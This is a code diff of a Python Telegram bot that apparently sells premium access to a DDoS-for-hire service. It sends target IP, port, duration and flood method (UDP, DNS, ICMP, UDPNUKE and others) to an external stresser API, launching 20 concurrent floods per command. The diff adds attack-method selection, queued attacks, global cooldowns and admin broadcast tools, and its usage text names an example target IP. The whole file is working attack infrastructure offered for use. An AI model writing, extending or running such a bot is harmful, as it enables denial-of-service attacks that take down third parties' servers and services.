@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH WORKING ATTACKS
+# app.py - COMPLETE ULTIMATE VERSION WITH ALL FEATURES
 import os
 import logging
 import asyncio
@@ -26,7 +26,7 @@ load_dotenv()
 # ===== CONFIGURATION =====
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY")
-API_URL = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")  # Make this configurable
+API_URL = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")
 MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
@@ -36,6 +36,12 @@ MIN_DURATION = 60
 MAX_DURATION = 100
 MIN_COOLDOWN = 60
 MAX_COOLDOWN = 100
+
+# Attack Methods
+ATTACK_METHODS = [
+    "UDP", "DNS", "Telegram-VC", "UDPNUKE", "VSE", 
+    "UDP-BIG", "SAMP", "ICMP"
+]
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -67,9 +73,22 @@ class Database:
                 self.codes = self.db.redeem_codes
                 self.logs = self.db.attack_logs
                 self.admins = self.db.admins
+                self.broadcasts = self.db.broadcasts
+                self.settings = self.db.settings
                 
                 self.users.create_index("user_id", unique=True)
                 self.codes.create_index("code", unique=True)
+                self.broadcasts.create_index("created_at", -1)
+                
+                # Initialize settings if not exists
+                if not self.settings.find_one({"_id": "bot_settings"}):
+                    self.settings.insert_one({
+                        "_id": "bot_settings",
+                        "pause_all": False,
+                        "paused_by": None,
+                        "paused_at": None,
+                        "pause_reason": None
+                    })
                 
                 logger.info("✅ MongoDB connected")
             else:
@@ -81,6 +100,8 @@ class Database:
             self.codes = {}
             self.logs = []
             self.admins = {}
+            self.broadcasts = []
+            self.settings = {"pause_all": False}
     
     def add_user(self, user_id, username=None, first_name=None):
         if not self.memory_mode:
@@ -125,7 +146,6 @@ class Database:
         return self.users.get(user_id)
     
     def get_user_plan(self, user_id):
-        """Get user's plan and expiry - FIXED with debug logging"""
         user = self.get_user(user_id)
         if not user:
             logger.warning(f"User {user_id} not found in database")
@@ -136,18 +156,14 @@ class Database:
         
         logger.info(f"DEBUG: User {user_id} - Raw data: plan={plan}, expiry={expiry}")
         
-        # If plan is free, return free
         if plan == "free":
             return "free", None
         
-        # If plan is premium, check expiry
         if plan == "premium":
-            # If no expiry, it's lifetime
             if expiry is None:
                 logger.info(f"DEBUG: User {user_id} has LIFETIME premium")
                 return "premium", None
             
-            # Handle string expiry
             if isinstance(expiry, str):
                 try:
                     expiry = datetime.fromisoformat(expiry)
@@ -156,7 +172,6 @@ class Database:
                     logger.error(f"DEBUG: Error parsing expiry for {user_id}: {e}")
                     return "premium", None
             
-            # Check if expired
             if expiry and isinstance(expiry, datetime):
                 if expiry < datetime.now():
                     logger.info(f"DEBUG: User {user_id} plan expired at {expiry}")
@@ -171,7 +186,6 @@ class Database:
         return plan, expiry
     
     def update_user_plan(self, user_id, plan, expiry):
-        """Update user plan"""
         if not self.memory_mode:
             expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
             result = self.users.update_one(
@@ -479,6 +493,56 @@ class Database:
                     count += 1
             return count
     
+    def log_broadcast(self, broadcast_id, sent_by, total_users, successful, failed, media_type=None):
+        if not self.memory_mode:
+            self.broadcasts.insert_one({
+                "broadcast_id": broadcast_id,
+                "sent_by": sent_by,
+                "total_users": total_users,
+                "successful": successful,
+                "failed": failed,
+                "media_type": media_type,
+                "created_at": datetime.now()
+            })
+        else:
+            self.broadcasts.append({
+                "broadcast_id": broadcast_id,
+                "sent_by": sent_by,
+                "total_users": total_users,
+                "successful": successful,
+                "failed": failed,
+                "media_type": media_type,
+                "created_at": datetime.now()
+            })
+    
+    def get_broadcast_stats(self):
+        if not self.memory_mode:
+            return list(self.broadcasts.find({}).sort("created_at", -1).limit(10))
+        else:
+            return self.broadcasts[-10:]
+    
+    def get_pause_status(self):
+        if not self.memory_mode:
+            settings = self.settings.find_one({"_id": "bot_settings"})
+            if settings:
+                return settings.get("pause_all", False)
+        return self.settings.get("pause_all", False)
+    
+    def set_pause(self, paused, paused_by=None, reason=None):
+        if not self.memory_mode:
+            self.settings.update_one(
+                {"_id": "bot_settings"},
+                {"$set": {
+                    "pause_all": paused,
+                    "paused_by": paused_by,
+                    "paused_at": datetime.now() if paused else None,
+                    "pause_reason": reason
+                }},
+                upsert=True
+            )
+        self.settings["pause_all"] = paused
+        logger.info(f"✅ Bot pause set to {paused} by {paused_by}")
+    
     def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=20):
         log = {
             "user_id": user_id,
@@ -561,6 +625,15 @@ class AttackManager:
         self.attack_start_time = None
         self.current_attack_duration = 0
         self.attack_end_time = None
+        self.attack_queue = []
+        self.processing_queue = False
+        
+        # Global cooldown settings
+        self.global_cooldown_active = False
+        self.global_cooldown_end = None
+        self.last_attack_user = None
+        self.last_attack_time = None
+        self.last_attack_duration = 0
     
     def get_cooldown_time(self, duration):
         cooldown = duration + 5
@@ -572,6 +645,13 @@ class AttackManager:
     
     def can_start_attack(self, user_id):
         with self.lock:
+            # Check global cooldown
+            if self.global_cooldown_active and self.global_cooldown_end:
+                if datetime.now() < self.global_cooldown_end:
+                    remaining = int((self.global_cooldown_end - datetime.now()).total_seconds())
+                    return False, f"🌍 *Global Cooldown Active*\n\nWait {remaining}s before next attack.\nLast attack by: {self.last_attack_user}"
+            
+            # Check if attack already running
             if self.global_attack_running:
                 remaining = 0
                 if self.attack_end_time:
@@ -580,6 +660,7 @@ class AttackManager:
                         remaining = 0
                 return False, f"❌ Attack already running!\nUser: {self.current_attacker}\n⏳ Time remaining: {remaining}s"
             
+            # Check user cooldown
             last_attack_time = db.get_last_attack_time(user_id)
             last_duration = db.get_last_attack_duration(user_id)
             
@@ -595,13 +676,16 @@ class AttackManager:
                     elapsed = (datetime.now() - last_attack_time).total_seconds()
                     if elapsed < cooldown_time:
                         remaining = int(cooldown_time - elapsed)
-                        return False, f"⏳ Cooldown: {remaining}s remaining\n(Attack: {last_duration}s → Cooldown: {cooldown_time}s)"
+                        return False, f"⏳ User Cooldown: {remaining}s remaining\n(Attack: {last_duration}s → Cooldown: {cooldown_time}s)"
             
+            # Check user concurrent attacks
             user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
             if user_attacks >= MAX_CONCURRENT:
                 return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
+            
             if len(self.active_attacks) >= 100:
                 return False, "❌ Too many active attacks globally."
+            
             return True, "OK"
     
     def start_attack(self, user_id, target, port, duration, method, attack_num):
@@ -615,6 +699,14 @@ class AttackManager:
             self.attack_start_time = datetime.now()
             self.current_attack_duration = duration
             self.attack_end_time = datetime.now() + timedelta(seconds=duration + 5)
+            
+            # Set global cooldown
+            self.global_cooldown_active = True
+            cooldown = self.get_cooldown_time(duration)
+            self.global_cooldown_end = datetime.now() + timedelta(seconds=cooldown)
+            self.last_attack_user = user_id
+            self.last_attack_time = datetime.now()
+            self.last_attack_duration = duration
             
             self.active_attacks[attack_id] = {
                 'id': attack_id,
@@ -656,6 +748,13 @@ class AttackManager:
                 remaining = int((self.attack_end_time - datetime.now()).total_seconds())
                 if remaining < 0:
                     remaining = 0
+            
+            global_cooldown_remaining = 0
+            if self.global_cooldown_active and self.global_cooldown_end:
+                global_cooldown_remaining = int((self.global_cooldown_end - datetime.now()).total_seconds())
+                if global_cooldown_remaining < 0:
+                    global_cooldown_remaining = 0
+            
             return {
                 'active': active,
                 'concurrent_busy': self.concurrent_busy,
@@ -665,8 +764,90 @@ class AttackManager:
                 'current_user': self.current_attacker,
                 'start_time': self.attack_start_time,
                 'duration': self.current_attack_duration,
-                'remaining': remaining
+                'remaining': remaining,
+                'global_cooldown_remaining': global_cooldown_remaining,
+                'queue_size': len(self.attack_queue)
             }
+    
+    def add_to_queue(self, user_id, target, port, duration, method, context):
+        self.attack_queue.append({
+            'user_id': user_id,
+            'target': target,
+            'port': port,
+            'duration': duration,
+            'method': method,
+            'context': context,
+            'added_at': datetime.now()
+        })
+        
+        if not self.processing_queue:
+            asyncio.create_task(self.process_queue())
+    
+    async def process_queue(self):
+        self.processing_queue = True
+        while self.attack_queue:
+            attack_data = self.attack_queue.pop(0)
+            user_id = attack_data['user_id']
+            
+            # Check if user can start
+            can_start, msg = self.can_start_attack(user_id)
+            if not can_start:
+                try:
+                    await attack_data['context'].bot.send_message(
+                        chat_id=user_id,
+                        text=f"⏳ *Queue Position*\n\nYour attack is queued.\n{msg}\n\nYou'll be notified when your attack starts.",
+                        parse_mode='Markdown'
+                    )
+                except:
+                    pass
+                continue
+            
+            # Start the attack
+            try:
+                attack_id = self.start_attack(
+                    user_id, 
+                    attack_data['target'], 
+                    attack_data['port'], 
+                    attack_data['duration'], 
+                    attack_data['method'], 
+                    0
+                )
+                
+                result = await send_concurrent_attacks(
+                    attack_data['target'], 
+                    attack_data['port'], 
+                    attack_data['duration'], 
+                    user_id, 
+                    attack_data['context']
+                )
+                
+                if result:
+                    attack_info = db.log_attack(
+                        user_id, 
+                        attack_data['target'], 
+                        attack_data['port'], 
+                        attack_data['duration'], 
+                        attack_data['method'],
+                        "success" if result.get('success') else "failed",
+                        str(result)
+                    )
+                    await send_attack_alert(attack_info)
+                
+                self.stop_attack(attack_id)
+                self.cleanup()
+                
+            except Exception as e:
+                logger.error(f"Queue attack failed: {e}")
+                try:
+                    await attack_data['context'].bot.send_message(
+                        chat_id=user_id,
+                        text=f"❌ *Attack Failed*\n\nError: {str(e)}",
+                        parse_mode='Markdown'
+                    )
+                except:
+                    pass
+        
+        self.processing_queue = False
     
     def cleanup(self):
         with self.lock:
@@ -725,15 +906,15 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK - FIXED =====
-async def send_api_attack(target, port, duration, attack_num, api_key, api_url):
-    """Send single API attack request"""
+# ===== API ATTACK =====
+async def send_api_attack(target, port, duration, attack_num, api_key, api_url, method):
+    """Send single API attack request with method selection"""
     params = {
         "key": api_key,
         "host": target,
         "port": port,
         "time": duration,
-        "method": "udp"
+        "method": method.lower()
     }
     
     headers = {
@@ -752,35 +933,38 @@ async def send_api_attack(target, port, duration, attack_num, api_key, api_url):
                 elapsed = time.time() - start_time
                 response_text = await response.text()
                 
-                logger.info(f"Attack {attack_num}: Status={response.status}, Time={elapsed:.2f}s")
+                logger.info(f"Attack {attack_num} ({method}): Status={response.status}, Time={elapsed:.2f}s")
                 
                 return {
                     "success": response.status == 200,
                     "attack_num": attack_num,
                     "status": response.status,
                     "elapsed": f"{elapsed:.2f}s",
-                    "response": response_text[:100]
+                    "response": response_text[:100],
+                    "method": method
                 }
                     
     except asyncio.TimeoutError:
-        logger.error(f"Attack {attack_num} timed out")
+        logger.error(f"Attack {attack_num} ({method}) timed out")
         return {
             "success": False,
             "attack_num": attack_num,
-            "error": "Timeout"
+            "error": "Timeout",
+            "method": method
         }
     except Exception as e:
-        logger.error(f"Attack {attack_num} failed: {e}")
+        logger.error(f"Attack {attack_num} ({method}) failed: {e}")
         return {
             "success": False,
             "attack_num": attack_num,
-            "error": str(e)[:50]
+            "error": str(e)[:50],
+            "method": method
         }
 
-# ===== CONCURRENT ATTACKS - FIXED =====
-async def send_concurrent_attacks(target, port, duration, user_id, context):
-    """Send multiple concurrent attacks"""
-    logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent UDP attacks on {target}:{port}")
+# ===== CONCURRENT ATTACKS =====
+async def send_concurrent_attacks(target, port, duration, user_id, context, method="UDP"):
+    """Send multiple concurrent attacks with selected method"""
+    logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent {method} attacks on {target}:{port}")
     
     api_key = os.getenv("API_KEY")
     api_url = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")
@@ -799,6 +983,7 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
         text=f"🔥 *ATTACK STARTING*\n\n"
              f"🎯 Target: `{target}:{port}`\n"
              f"⏱️ Duration: `{duration}s`\n"
+             f"📡 Method: `{method.upper()}`\n"
              f"⚡ Attacks: `{MAX_CONCURRENT} CONCURRENT`\n"
              f"🔄 Sending requests...",
         parse_mode='Markdown'
@@ -807,11 +992,11 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
     # Create all tasks
     tasks = []
     for i in range(1, MAX_CONCURRENT + 1):
-        task = send_api_attack(target, port, duration, i, api_key, api_url)
+        task = send_api_attack(target, port, duration, i, api_key, api_url, method)
         tasks.append(task)
     
     # Start timer update task
-    timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
+    timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port, method))
     
     # Run all tasks concurrently
     start_time = time.time()
@@ -832,11 +1017,11 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
         elif isinstance(r, dict):
             if r.get('success', False):
                 success_count += 1
-                result_details.append(f"✅ Attack {r.get('attack_num', '?')} - {r.get('elapsed', 'N/A')}")
+                result_details.append(f"✅ Attack {r.get('attack_num', '?')} ({r.get('method', 'UDP')}) - {r.get('elapsed', 'N/A')}")
             else:
                 failed_count += 1
                 error = r.get('error', r.get('response', 'Unknown error'))
-                result_details.append(f"❌ Attack {r.get('attack_num', '?')} - {error[:30]}")
+                result_details.append(f"❌ Attack {r.get('attack_num', '?')} ({r.get('method', 'UDP')}) - {error[:30]}")
     
     # Create final message
     cooldown = attack_manager.get_cooldown_time(duration)
@@ -845,11 +1030,12 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
         f"✅ *ATTACK COMPLETE!*\n\n"
         f"🎯 Target: `{target}:{port}`\n"
         f"⏱️ Duration: `{duration}s`\n"
+        f"📡 Method: `{method.upper()}`\n"
         f"✅ Successful: `{success_count}/{MAX_CONCURRENT}`\n"
         f"❌ Failed: `{failed_count}/{MAX_CONCURRENT}`\n"
         f"⏱️ Total Time: `{elapsed:.2f}s`\n"
         f"⚡ Status: {'✅ COMPLETED' if success_count > 0 else '❌ FAILED'}\n\n"
-        f"⏳ Cooldown: {cooldown}s\n"
+        f"⏳ Global Cooldown: {cooldown}s\n"
         f"⏳ Next attack in: `{cooldown}s`\n\n"
         f"📊 *Results:*\n" + "\n".join(result_details[:5])
     )
@@ -867,10 +1053,11 @@ async def send_concurrent_attacks(target, port, duration, user_id, context):
         "results": results,
         "target": target,
         "port": port,
-        "duration": duration
+        "duration": duration,
+        "method": method
     }
 
-async def update_timer(status_msg, duration, target, port):
+async def update_timer(status_msg, duration, target, port, method="UDP"):
     """Update the attack timer in the message"""
     try:
         start_time = time.time()
@@ -890,6 +1077,7 @@ async def update_timer(status_msg, duration, target, port):
                         f"🔥 *ATTACK RUNNING*\n\n"
                         f"🎯 Target: `{target}:{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
+                        f"📡 Method: `{method.upper()}`\n"
                         f"⚡ Attacks: `{MAX_CONCURRENT} CONCURRENT`\n"
                         f"⏳ Time Remaining: `{remaining}s`\n"
                         f"⏱️ Elapsed: `{int(elapsed)}s`\n\n"
@@ -906,7 +1094,7 @@ async def update_timer(status_msg, duration, target, port):
     except Exception as e:
         logger.error(f"Timer update error: {e}")
 
-# ===== CHECK API STATUS - FIXED =====
+# ===== CHECK API STATUS =====
 async def check_api_status():
     """Check if the API is working"""
     try:
@@ -942,6 +1130,270 @@ async def check_api_status():
     except Exception as e:
         return False, f"❌ Connection Failed: {str(e)[:50]}"
 
+# ===== BROADCAST FUNCTIONS =====
+async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not db.is_admin(user_id):
+        await update.message.reply_text("❌ You don't have permission to use this command!")
+        return
+    
+    await update.message.reply_text(
+        "📢 *BROADCAST*\n\n"
+        "Send me the message you want to broadcast to all users.\n"
+        "You can send:\n"
+        "• Text message\n"
+        "• Photo (with caption)\n"
+        "• Video (with caption)\n\n"
+        "⚠️ *Warning:* This will send to ALL bot users!\n"
+        "Send /cancel to cancel.",
+        parse_mode='Markdown'
+    )
+    context.user_data['awaiting_broadcast'] = True
+
+async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get('awaiting_broadcast'):
+        return
+    
+    if update.message.text and update.message.text.lower() == '/cancel':
+        context.user_data['awaiting_broadcast'] = False
+        await update.message.reply_text("✅ Broadcast cancelled.")
+        return
+    
+    user_id = update.effective_user.id
+    
+    if not db.is_admin(user_id):
+        await update.message.reply_text("❌ You don't have permission!")
+        context.user_data['awaiting_broadcast'] = False
+        return
+    
+    users = db.get_all_users()
+    total_users = len(users)
+    
+    if total_users == 0:
+        await update.message.reply_text("❌ No users to broadcast to!")
+        context.user_data['awaiting_broadcast'] = False
+        return
+    
+    progress_msg = await update.message.reply_text(
+        f"📢 *Broadcasting...*\n\n"
+        f"👥 Total users: {total_users}\n"
+        f"⏳ Progress: 0/{total_users}\n"
+        f"✅ Success: 0\n"
+        f"❌ Failed: 0\n"
+        f"⏱️ Estimated time: Calculating...",
+        parse_mode='Markdown'
+    )
+    
+    message_text = None
+    photo_file_id = None
+    video_file_id = None
+    caption = None
+    
+    if update.message.text:
+        message_text = update.message.text
+        media_type = "text"
+    elif update.message.photo:
+        photo_file_id = update.message.photo[-1].file_id
+        caption = update.message.caption
+        media_type = "photo"
+    elif update.message.video:
+        video_file_id = update.message.video.file_id
+        caption = update.message.caption
+        media_type = "video"
+    else:
+        await update.message.reply_text("❌ Unsupported media type! Please send text, photo, or video.")
+        context.user_data['awaiting_broadcast'] = False
+        return
+    
+    successful = 0
+    failed = 0
+    failed_users = []
+    start_time = time.time()
+    
+    for i, user in enumerate(users):
+        user_id2 = user['user_id']
+        
+        if db.is_banned(user_id2):
+            continue
+        
+        try:
+            if message_text:
+                await context.bot.send_message(
+                    chat_id=user_id2,
+                    text=message_text,
+                    parse_mode='Markdown'
+                )
+            elif photo_file_id:
+                await context.bot.send_photo(
+                    chat_id=user_id2,
+                    photo=photo_file_id,
+                    caption=caption,
+                    parse_mode='Markdown'
+                )
+            elif video_file_id:
+                await context.bot.send_video(
+                    chat_id=user_id2,
+                    video=video_file_id,
+                    caption=caption,
+                    parse_mode='Markdown'
+                )
+            successful += 1
+        except Exception as e:
+            failed += 1
+            failed_users.append(f"{user_id2}: {str(e)[:30]}")
+            logger.error(f"Failed to send broadcast to {user_id2}: {e}")
+        
+        if (i + 1) % 10 == 0 or (i + 1) == total_users:
+            elapsed = time.time() - start_time
+            estimated_total = (elapsed / (i + 1)) * total_users if i > 0 else 0
+            remaining = max(0, estimated_total - elapsed)
+            
+            try:
+                await progress_msg.edit_text(
+                    f"📢 *Broadcasting...*\n\n"
+                    f"👥 Total users: {total_users}\n"
+                    f"⏳ Progress: {i + 1}/{total_users}\n"
+                    f"✅ Success: {successful}\n"
+                    f"❌ Failed: {failed}\n"
+                    f"⏱️ Elapsed: {int(elapsed)}s\n"
+                    f"⏳ Remaining: {int(remaining)}s",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+        
+        await asyncio.sleep(0.05)
+    
+    broadcast_id = f"broadcast_{int(time.time())}"
+    db.log_broadcast(broadcast_id, user_id, total_users, successful, failed, media_type)
+    
+    result_text = (
+        f"✅ *Broadcast Complete!*\n\n"
+        f"👥 Total users: {total_users}\n"
+        f"✅ Successful: {successful}\n"
+        f"❌ Failed: {failed}\n"
+        f"⏱️ Time taken: {int(time.time() - start_time)}s\n"
+        f"📊 Success rate: {int((successful / total_users) * 100) if total_users > 0 else 0}%\n"
+        f"📝 Broadcast ID: `{broadcast_id}`"
+    )
+    
+    if failed_users:
+        result_text += f"\n\n❌ *Failed users:*\n" + "\n".join(failed_users[:5])
+        if len(failed_users) > 5:
+            result_text += f"\n... and {len(failed_users) - 5} more"
+    
+    await progress_msg.edit_text(result_text, parse_mode='Markdown')
+    
+    admins = db.get_admins()
+    for admin in admins:
+        try:
+            if admin['user_id'] != user_id:
+                await context.bot.send_message(
+                    chat_id=admin['user_id'],
+                    text=f"📢 *Broadcast Completed*\n\n"
+                         f"By: `{user_id}`\n"
+                         f"Successful: {successful}\n"
+                         f"Failed: {failed}\n"
+                         f"ID: `{broadcast_id}`",
+                    parse_mode='Markdown'
+                )
+        except:
+            pass
+    
+    context.user_data['awaiting_broadcast'] = False
+
+async def broadcast_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not db.is_admin(user_id):
+        await update.message.reply_text("❌ You don't have permission!")
+        return
+    
+    broadcasts = db.get_broadcast_stats()
+    
+    if not broadcasts:
+        await update.message.reply_text("📊 No broadcasts sent yet.")
+        return
+    
+    text = "📊 *Broadcast History*\n\n"
+    for b in broadcasts[:10]:
+        created_at = b.get('created_at', datetime.now())
+        if isinstance(created_at, datetime):
+            created_at_str = created_at.strftime('%Y-%m-%d %H:%M')
+        else:
+            created_at_str = str(created_at)
+        
+        media_type = b.get('media_type', 'text').upper()
+        total = b.get('total_users', 0)
+        successful = b.get('successful', 0)
+        failed = b.get('failed', 0)
+        success_rate = int((successful / total) * 100) if total > 0 else 0
+        
+        text += f"📅 {created_at_str}\n"
+        text += f"📎 Type: {media_type}\n"
+        text += f"👥 {successful}/{total} ({success_rate}%)\n"
+        text += f"❌ Failed: {failed}\n\n"
+    
+    await update.message.reply_text(text, parse_mode='Markdown')
+
+# ===== OWNER PAUSE FUNCTIONS =====
+async def toggle_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Toggle pause for all members"""
+    user_id = update.effective_user.id
+    
+    if not db.is_owner_or_pseudo(user_id):
+        await update.message.reply_text("❌ Only Owner and Pseudo_Owner can pause the bot!")
+        return
+    
+    current_pause = db.get_pause_status()
+    
+    if current_pause:
+        # Unpause
+        db.set_pause(False, user_id)
+        await update.message.reply_text(
+            "✅ *Bot Unpaused*\n\n"
+            "All users can now use the bot again!",
+            parse_mode='Markdown'
+        )
+        
+        # Notify admins
+        admins = db.get_admins()
+        for admin in admins:
+            try:
+                await context.bot.send_message(
+                    chat_id=admin['user_id'],
+                    text=f"✅ *Bot Unpaused*\n\nBy: `{user_id}`",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+    else:
+        # Pause
+        reason = " ".join(context.args) if context.args else "No reason provided"
+        db.set_pause(True, user_id, reason)
+        await update.message.reply_text(
+            f"⏸️ *Bot Paused*\n\n"
+            f"All users are now paused from using the bot.\n"
+            f"Reason: {reason}\n\n"
+            f"Use `/pause` again to unpause.",
+            parse_mode='Markdown'
+        )
+        
+        # Notify admins
+        admins = db.get_admins()
+        for admin in admins:
+            try:
+                await context.bot.send_message(
+                    chat_id=admin['user_id'],
+                    text=f"⏸️ *Bot Paused*\n\n"
+                         f"By: `{user_id}`\n"
+                         f"Reason: {reason}",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -955,6 +1407,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_owner = db.is_owner_or_pseudo(user_id)
     
     logger.info(f"User {user_id} - Plan: {plan}, Expiry: {expiry}, Is Admin: {is_admin}, Is Owner: {is_owner}")
+    
+    # Check pause status
+    if db.get_pause_status():
+        await update.message.reply_text(
+            "⏸️ *Bot is Paused*\n\n"
+            "The bot is currently paused by the owner.\n"
+            "Please wait until it's unpaused.",
+            parse_mode='Markdown'
+        )
+        return
     
     total_attacks = db.get_user_stats(user_id)
     stats = attack_manager.get_stats()
@@ -990,16 +1452,22 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 remaining = int(cooldown - elapsed)
                 cooldown_status = f"\n⏳ *Cooldown:* {remaining}s remaining\n(Attack: {last_duration}s → Cooldown: {cooldown}s)"
     
+    # Global cooldown status
+    global_cooldown_status = ""
+    if stats['global_cooldown_remaining'] > 0:
+        global_cooldown_status = f"\n🌍 *Global Cooldown:* {stats['global_cooldown_remaining']}s remaining"
+    
     welcome_msg = (
         f"👋 *WELCOME TO GURU*\n\n"
         f"Hello {first_name}! 👋\n"
         f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
         f"⚡ {MAX_CONCURRENT}x UDP Concurrent: {'✅ ENABLED' if plan == 'premium' else '❌ PREMIUM ONLY'}\n"
-        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}{attack_status}{cooldown_status}\n\n"
-        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
+        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}{attack_status}{cooldown_status}{global_cooldown_status}\n\n"
+        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME METHOD'}\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n"
-        f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (based on attack time)"
+        f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (based on attack time)\n\n"
+        f"📡 *Attack Methods:*\n" + "\n".join([f"• {m}" for m in ATTACK_METHODS])
     )
     
     keyboard = []
@@ -1023,6 +1491,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ===== ATTACK COMMAND =====
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    # Check pause status
+    if db.get_pause_status():
+        await update.message.reply_text(
+            "⏸️ *Bot is Paused*\n\n"
+            "The bot is currently paused by the owner.",
+            parse_mode='Markdown'
+        )
+        return
     
     plan, expiry = db.get_user_plan(user_id)
     is_admin = db.is_admin(user_id)
@@ -1052,11 +1529,12 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
-            f"❌ *Usage:* `/attack IP PORT TIME`\n\n"
-            f"Example: `/attack 91.108.17.41 32001 60`\n\n"
-            f"⚡ {MAX_CONCURRENT} concurrent UDP attacks!\n"
+            f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
+            f"Example: `/attack 91.108.17.41 32001 60 UDP`\n\n"
+            f"⚡ {MAX_CONCURRENT} concurrent attacks!\n"
             f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
-            f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (based on attack time)",
+            f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (based on attack time)\n\n"
+            f"📡 *Available Methods:*\n" + "\n".join([f"• {m}" for m in ATTACK_METHODS]),
             parse_mode='Markdown'
         )
         return
@@ -1065,6 +1543,11 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         target = args[0]
         port = int(args[1])
         duration = int(args[2])
+        
+        # Get method (default UDP)
+        method = args[3].upper() if len(args) > 3 else "UDP"
+        if method not in ATTACK_METHODS:
+            method = "UDP"
         
         if duration < MIN_DURATION:
             await update.message.reply_text(f"❌ Minimum duration is {MIN_DURATION} seconds!")
@@ -1075,16 +1558,27 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
-            await update.message.reply_text(msg)
-            return
+            # If global cooldown is active, add to queue
+            if "Global Cooldown" in msg:
+                attack_manager.add_to_queue(user_id, target, port, duration, method, context)
+                await update.message.reply_text(
+                    f"⏳ *Added to Queue*\n\n"
+                    f"{msg}\n\n"
+                    f"Your attack will start automatically when the global cooldown ends.",
+                    parse_mode='Markdown'
+                )
+                return
+            else:
+                await update.message.reply_text(msg)
+                return
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, method, 0)
         
-        result = await send_concurrent_attacks(target, port, duration, user_id, context)
+        result = await send_concurrent_attacks(target, port, duration, user_id, context, method)
         
         if result:
             attack_info = db.log_attack(
-                user_id, target, port, duration, "udp",
+                user_id, target, port, duration, method,
                 "success" if result.get('success') else "failed",
                 str(result)
             )
@@ -1104,6 +1598,14 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     user_id = query.from_user.id
+    
+    if db.get_pause_status():
+        await query.edit_message_text(
+            "⏸️ *Bot is Paused*\n\n"
+            "The bot is currently paused by the owner.",
+            parse_mode='Markdown'
+        )
+        return
     
     plan, expiry = db.get_user_plan(user_id)
     is_admin = db.is_admin(user_id)
@@ -1133,17 +1635,40 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(msg, parse_mode='Markdown')
         return
     
+    # Show method selection
+    keyboard = []
+    for method in ATTACK_METHODS:
+        keyboard.append([InlineKeyboardButton(f"📡 {method}", callback_data=f"method_{method}")])
+    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
+    
     await query.edit_message_text(
-        f"💥 *ATTACK*\n\n"
-        "Send: `IP PORT TIME`\n"
-        "Example: `91.108.17.41 32001 60`\n\n"
-        f"⚡ {MAX_CONCURRENT} concurrent UDP attacks!\n"
-        f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
-        f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (based on attack time)\n"
-        "Send /cancel to cancel",
